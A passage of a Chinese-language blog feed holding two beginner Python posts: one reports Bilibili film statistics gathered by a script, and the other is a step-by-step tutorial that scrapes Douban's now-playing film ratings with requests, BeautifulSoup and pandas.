        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>hello大家好，这里是TeamsSix，昨天晚上11点多的突然想在B站看电影了，但是又不知道那个电影值得看，于是首先想到的是去各大影评UP主的频道里面看看，转了几圈后发现他们讲解的电影B站很多都没有，这个时候又想到了一种方法，就是在B站搜索：“在B站值得看的电影”，没想到以前还真有UP主统计过：</p><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>点进去之后发现UP主居然手动统计了160多部电影，最后他做成了一个表格，看完了之后立刻给了三连，因为在我看来每一位付出了努力与汗水的UP主都值得被尊重（疯狂暗示），事后就想到能不能用我这三脚猫的Python水平统计一下B站最值得看的电影呢？<br>有了想法，立刻从床上爬了起来，在夜黑风高的晚上开始垒起了代码，终于经历了一个通宵的时间之后完成了这个想法。</p><h1 id="0x01-代码运行"><a href="#0x01-代码运行" class="headerlink" title="0x01 代码运行"></a>0x01 代码运行</h1><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>具体代码见文章底部链接</p></blockquote><h1 id="0x02-运行结果"><a href="#0x02-运行结果" class="headerlink" title="0x02 运行结果"></a>0x02 运行结果</h1><p>通过刚才的运行结果，可以看到，播放数量最高的是《你的名字》，足足有一千八百多万的播放量<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>弹幕数量最高的还是《你的名字》，有高达98万条弹幕<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>硬币数量最多的依然是《你的名字》，硬币数量达到了39万个<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>追剧人数最高的《命运之夜–天之杯：恶兆之花》<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>B站评分最高的不详，因为评分最高9.9的视频比较多，所以B站评分没有统计到视频最后的汇总里<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie8.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>在B站的电影中豆瓣评分最高的是《武林外传》，高达9.5分<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie9.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>B站评分与豆瓣评分差最大的是《深夜食堂》，两个平台差了7分，这部电影我也看过，表示还阔以，不明白为什么豆瓣评分那么低。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie10.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>ok，最后我们再来总结一下，B站的电影中播放数量、弹幕数量、硬币数量最高的均为《你的名字》，可以说是B站电影区当之无愧的C位，其余《刀剑神域：序列之争》《声之形》《白蛇：缘起》也都经常出现在前三之中。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie11.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie12.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03 结语"></a>0x03 结语</h1><p>在视频的最后再简单说两句，这些数据都是可以导出为表格的，另外在写代码的中间有个小插曲，就是在获取豆瓣搜索结果中电影评分的时候，发现电影数据都是被加密的，就像这个样子<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie13.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>最后通过SergioJune在Github上提供的代码得以解决，在这里也向他表示感谢<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie14.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>文章代码：<a href="https://github.com/teamssix/bilibili-movie">https://github.com/teamssix/bilibili-movie</a></p></blockquote><p>演示视频：</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=56117996&cid=98086981&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"> </iframe></div><p>如果视频不能全屏播放，请点击<a href="https://www.bilibili.com/video/av56117996/" title="源链接">源链接</a>观看。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 实例 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 电影 </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python实例】让Python告诉你当前最火的电影是什么</title>
      <link href="//190618-225704.html"/>
      <url>//190618-225704.html</url>
      
        <content type="html"><![CDATA[<p>话不多说，先让我们看看最终效果图：</p><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>那么如何使用Python来获取这些信息呢？</p><h1 id="一、需求与思路"><a href="#一、需求与思路" class="headerlink" title="一、需求与思路"></a>一、需求与思路</h1><h1 id="1、需求"><a href="#1、需求" class="headerlink" title="1、需求"></a>1、需求</h1><p>首先要知道最近正在上映的电影的名称、评分、评论数等等，这些都可以在豆瓣上找得到，因此本次数据挖掘对象就确定为豆瓣电影官网。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="2、思路"><a href="#2、思路" class="headerlink" title="2、思路"></a>2、思路</h1><p>a、调用requests模块向豆瓣电影官网发出请求<br>b、调用BeautifulSoup模块从返回的html中提取数据<br>c、调用pandas模块将提取的数据转为表格样式</p><h1 id="二、开工"><a href="#二、开工" class="headerlink" title="二、开工"></a>二、开工</h1><h1 id="1、发出请求"><a href="#1、发出请求" class="headerlink" title="1、发出请求"></a>1、发出请求</h1><p>设置好headers,url，调用requests模块向目标网站发出请求，最后结果存储在res中</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'</span><span class="token punctuation">&#125;</span>url <span class="token operator">=</span> <span class="token string">'https://movie.douban.com/cinema/nowplaying/beijing/'</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers <span class="token operator">=</span> headers<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2、数据传入"><a href="#2、数据传入" class="headerlink" title="2、数据传入"></a>2、数据传入</h1><p>将html文本传入BeautifulSoup中，指定解析器为html.parser，并将解析内容传入soup</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoupsoup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="三、数据提取"><a href="#三、数据提取" class="headerlink" title="三、数据提取"></a>三、数据提取</h1><p>在介绍数据提取之前需要先介绍一个插件：infolite，这款插件可以直接查看到控件路径，而不需要到复杂的开发人员工具中就行查看。</p><h1 id="1、电影名"><a href="#1、电影名" class="headerlink" title="1、电影名"></a>1、电影名</h1><p>打开电影详情页面，找到电影名控件路径<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>最终修改为以下结果得到电影名称</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">insoup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'h1'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="2、豆瓣评分"><a href="#2、豆瓣评分" class="headerlink" title="2、豆瓣评分"></a>2、豆瓣评分</h1><p>根据同样原理可得到该电影的评分<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">insoup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'.rating_num'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="3、评论数量"><a href="#3、评论数量" class="headerlink" title="3、评论数量"></a>3、评论数量</h1><p>依旧是一样的思路，先利用InfoLite找到控件路径，再利用bs4模块提取对应内容。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm8.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">insoup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'.mod-hd a'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm9.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="4、简介"><a href="#4、简介" class="headerlink" title="4、简介"></a>4、简介</h1><p>对于简介因为里面有很多空格换行等，所以这里使用了正则替换空格。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm10.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">'\s'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span>insoup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'.related-info span'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm11.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>这里写个函数，为实现传入一个URL，返回该URL中信息的功能，最终四项都将传入result字典中，所以接下来要做的就是如何获取URL。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">pages</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    inres <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers <span class="token operator">=</span> headers<span class="token punctuation">)</span>    insoup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>inres<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>        result<span class="token punctuation">[</span><span class="token string">'电影名'</span><span class="token punctuation">]</span> <span class="token operator">=</span> insoup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'h1'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result<span class="token punctuation">[</span><span class="token string">'豆瓣评分'</span><span class="token punctuation">]</span> <span class="token operator">=</span> insoup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'.rating_num'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text    result<span class="token punctuation">[</span><span class="token string">'评论数量'</span><span class="token punctuation">]</span> <span class="token operator">=</span> insoup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'.mod-hd a'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    result<span class="token punctuation">[</span><span class="token string">'简介'</span><span class="token punctuation">]</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">'\s'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span>insoup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'.related-info span'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="四、提取URL"><a href="#四、提取URL" class="headerlink" title="四、提取URL"></a>四、提取URL</h1><p>因为我们要找的电影是正在上映的电影，因此从正在上映的电影列表中提取URL即可。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm12.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">url <span class="token operator">=</span> <span class="token string">'https://movie.douban.com/cinema/nowplaying/beijing/'</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers <span class="token operator">=</span> headers<span class="token punctuation">)</span>soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在soup中含有这些链接，soup.select()是列表类型，有的列表项含有URL，有的不含有，并且在调试过程中发现有的含有链接的却没有评分信息。<br>因此在以下语句中URL利用select存到urls中，利用判断语句来筛选掉一些没有评分的电影。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">pools <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> links <span class="token keyword">in</span> soup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'ul'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    urls <span class="token operator">=</span> links<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'href'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>links<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'.subject-rate'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">:</span>        pools<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pages<span class="token punctuation">(</span>urls<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终，每个URL的信息都被添加到pools数组中，但是这个时候直接输出pools会很乱，因此接下来要做的就是生成表格。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm13.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="五、表格生成"><a href="#五、表格生成" class="headerlink" title="五、表格生成"></a>五、表格生成</h1><p>生成表格的方法也非常简单</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandasdf <span class="token operator">=</span> pandas<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>pools<span class="token punctuation">)</span>df<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm14.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>不过这样不够明显，因此我们可以将简介放到后面，再排序一下<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm15.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h1><p>上面一张图可以明显看到今天的四个贺岁电影中，《流浪星球》不管是豆瓣评分还是评论的数量都是第一个，倒也是实至名归。<br>在整个过程中，碰到了很多问题，其中不乏有还未解决的问题，比如在提取电影标签的时候，因为正则使用的不熟而一直没有被很好的提取出来。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/hotfilm16.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>在做这个数据挖掘之前，还做了新浪新闻的信息抓取，这个电影信息的数据挖掘也相当于是练练手，后面还有的导出文档、导出到数据库的功能就没有做演示了，也是几行代码的事情。<br>用了一段时间Python后，真的不得不感叹到Python的强大之处，下面就把以上项目的全部代码展示出来吧，另外我还是个新手，代码写得十分笨拙，大佬还请绕步。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> pandas<span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoupheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'</span><span class="token punctuation">&#125;</span>url <span class="token operator">=</span> <span class="token string">'https://movie.douban.com/cinema/nowplaying/beijing/'</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers <span class="token operator">=</span> headers<span class="token punctuation">)</span>soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>pools <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> links <span class="token keyword">in</span> soup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'ul'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    urls <span class="token operator">=</span> links<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'href'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>links<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'.subject-rate'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">:</span>        pools<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pages<span class="token punctuation">(</span>urls<span class="token punctuation">)</span><span class="token punctuation">)</span>df <span class="token operator">=</span> pandas<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>pools<span class="token punctuation">,</span>columns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'电影名'</span><span class="token punctuation">,</span><span class="token string">'豆瓣评分'</span><span class="token punctuation">,</span><span class="token string">'评论数量'</span><span class="token punctuation">,</span><span class="token string">'简介'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>df<span class="token punctuation">.</span>sort_values<span class="token punctuation">(</span><span class="token string">'豆瓣评分'</span><span class="token punctuation">,</span>inplace <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">,</span>ascending <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>df<span class="token keyword">def</span> <span class="token function">pages</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    inres <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers <span class="token operator">=</span> headers<span class="token punctuation">)</span>    insoup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>inres<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>        result<span class="token punctuation">[</span><span class="token string">'电影名'</span><span class="token punctuation">]</span> <span class="token operator">=</span> insoup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'h1'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result<span class="token punctuation">[</span><span class="token string">'豆瓣评分'</span><span class="token punctuation">]</span> <span class="token operator">=</span> insoup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'.rating_num'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text    result<span class="token punctuation">[</span><span class="token string">'评论数量'</span><span class="token punctuation">]</span> <span class="token operator">=</span> insoup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'.mod-hd a'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    result<span class="token punctuation">[</span><span class="token string">'简介'</span><span class="token punctuation">]</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">'\s'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span>insoup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'.related-info span'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span aria-hidden="true" 